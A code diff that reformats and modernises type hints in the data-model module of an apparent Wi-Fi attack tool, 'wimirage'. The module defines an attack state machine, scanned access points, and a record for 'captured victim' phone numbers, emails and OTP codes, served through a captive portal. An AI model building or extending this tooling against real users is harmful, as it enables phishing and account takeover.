@@ -7,11 +7,11 @@ Exposes:
 - :class:`AppConfig` — runtime configuration with on-disk loading
 """
 
-from dataclasses import dataclass, field, replace, asdict
-from enum import Enum, auto
-from typing import Optional, Any
-import os
 import logging
+import os
+from dataclasses import asdict, dataclass, field, replace
+from enum import Enum, auto
+from typing import Any
 
 logger = logging.getLogger("wimirage")
 
@@ -25,6 +25,7 @@ __all__ = [
 
 class AttackState(Enum):
     """Finite-state machine for the orchestrated attack chain."""
+
     IDLE = auto()
     SCANNING = auto()
     SCANNED = auto()
@@ -38,10 +39,11 @@ class AttackState(Enum):
 @dataclass
 class AccessPoint:
     """A Wi-Fi access point discovered by :class:`core.scanner.APScanner`."""
+
     ssid: str
     bssid: str
     channel: int
-    signal: Optional[int] = None
+    signal: int | None = None
     encryption: str = "OPEN"
     clients: list[str] = field(default_factory=list)
 
@@ -49,11 +51,12 @@ class AccessPoint:
 @dataclass
 class Credential:
     """One captured victim data record, written to the credential JSONL."""
+
     timestamp: str
     client_ip: str
-    phone: Optional[str] = None
-    email: Optional[str] = None
-    otp: Optional[str] = None
+    phone: str | None = None
+    email: str | None = None
+    otp: str | None = None
     stage: str = "unknown"
 
 
@@ -65,6 +68,7 @@ class AppConfig:
 
         config = AppConfig.load("config/app.yml")
     """
+
     gateway: str = "10.0.0.1"
     dhcp_range: str = "10.0.0.2,10.0.0.100"
     portal_port: int = 80
@@ -88,7 +92,7 @@ class AppConfig:
     # --- Configuration loading (Section 2 #4) ----------------------------
 
     @classmethod
-    def load(cls, path: Optional[str] = None) -> "AppConfig":
+    def load(cls, path: str | None = None) -> "AppConfig":
         """Construct an :class:`AppConfig` by overlaying a YAML/TOML file.
 
         Args:
@@ -123,8 +127,8 @@ class AppConfig:
                     import tomllib  # py3.11+
                 except ImportError:  # pragma: no cover - 3.10 fallback
                     import tomli as tomllib  # type: ignore
-                with open(path, "rb") as f:
-                    data = tomllib.load(f) or {}
+                with open(path, "rb") as fb:
+                    data = tomllib.load(fb) or {}
             else:
                 logger.warning(f"Unknown config extension for {path}; using defaults.")
                 return cls()
@@ -132,11 +136,16 @@ class AppConfig:
             valid = {f.name for f in cls.__dataclass_fields__.values()}  # type: ignore[attr-defined]
             filtered = {k: v for k, v in data.items() if k in valid}
             return replace(cls(), **filtered)
-        except (yaml.YAMLError, tomllib.TOMLDecodeError, OSError,
-                ValueError, TypeError, KeyError) as e:
+        except (
+            yaml.YAMLError,
+            tomllib.TOMLDecodeError,
+            OSError,
+            ValueError,
+            TypeError,
+            KeyError,
+        ) as e:
             logger.error(
-                f"Failed to load config from {path}: {type(e).__name__}: {e}; "
-                "using defaults."
+                f"Failed to load config from {path}: {type(e).__name__}: {e}; using defaults."
             )
             return cls()
 
